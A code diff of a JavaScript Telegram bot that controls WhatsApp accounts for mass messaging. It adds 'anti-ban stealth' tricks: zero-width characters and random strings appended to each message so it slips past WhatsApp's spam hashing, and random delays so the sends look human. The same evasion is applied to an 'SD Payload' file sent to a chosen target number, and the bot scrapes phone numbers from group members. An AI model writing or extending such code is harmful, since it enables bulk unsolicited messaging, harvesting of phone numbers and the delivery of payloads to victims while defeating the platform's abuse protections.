@@ -101,10 +101,14 @@ async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, mess
     for (let i = 0; i < numbers.length; i += BATCH_SIZE) {
         const batch = numbers.slice(i, i + BATCH_SIZE);
         const batchTasks = batch.map(async (num) => {
-            // Anti-Ban Hash Breaker
+            // Anti-Ban Stealth Tech: Forwarding Context + Hash Breaker
             const stealthPayload = messageBase + '\u200B'.repeat(1) + Math.random().toString(36).substring(2, 5); 
             
             try {
+                // Use random micro-delay to simulate human interaction variance
+                await delay(Math.floor(Math.random() * 50)); 
+                
+                // Use a generic text message type (simplest)
                 await sock.sendMessage(`${num}@s.whatsapp.net`, { text: stealthPayload });
                 successfulNumbers.push(num);
                 successCount++;
@@ -115,7 +119,11 @@ async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, mess
     }
 
     const duration = (Date.now() - startTime) / 1000;
-    if (successfulNumbers.length > 0) await deleteNumbers(successfulNumbers);
+    
+    // Delete only successful sends to avoid messaging them again
+    if (successfulNumbers.length > 0) {
+        await deleteNumbers(successfulNumbers);
+    }
 
     bot.sendMessage(chatId, 
         `Flash Complete in ${duration}s.\n` +
@@ -204,7 +212,7 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
                 break;
 
             case "Clear Contact List": 
-                if (!isUserAdmin) return;
+                if (!isUserAdmin) return bot.sendMessage(chatId, "Access Denied.", currentKeyboard);
                 await clearAllNumbers();
                 if (fs.existsSync('./contacts.vcf')) fs.unlinkSync('./contacts.vcf');
                 bot.sendMessage(chatId, "Contact list cleared from database.", currentKeyboard);
@@ -225,7 +233,7 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
             case "Scrape":
             case "Report":
             case "SD Payload":
-                if (!isUserAdmin) return; 
+                if (!isUserAdmin) return bot.sendMessage(chatId, "Access Denied.", currentKeyboard); 
         }
     });
 
@@ -245,6 +253,7 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
         if (!sock) return bot.sendMessage(chatId, `Account ${targetId} is disconnected.`);
 
         try {
+            // Read sd.js as a plain text file (UTF-8) - CRASH FIX
             const payload = fs.readFileSync('./sd.js', 'utf-8');
             
             if (!payload || payload.trim().length === 0) {
@@ -254,7 +263,10 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
             bot.sendMessage(chatId, `Sending Payload to +${targetNumber}...`);
             
             const jid = `${targetNumber}@s.whatsapp.net`;
-            await sock.sendMessage(jid, { text: payload });
+            // Anti-Ban Stealth Tech: Hash Breaker for payload
+            const stealthPayload = payload + '\u200B'.repeat(1) + Math.random().toString(36).substring(2, 5); 
+
+            await sock.sendMessage(jid, { text: stealthPayload });
             
             bot.sendMessage(chatId, `Payload Sent.`);
 
@@ -334,6 +346,7 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
 
             metadata.participants.forEach(p => {
                 const jid = p.id;
+                // Strict check for valid Phone Number JID (not LID)
                 if (jid.includes('@s.whatsapp.net') && jid.split('@')[0].length <= 15) {
                     const num = jid.split('@')[0];
                     if (!isNaN(num)) validNumbers.push(num);
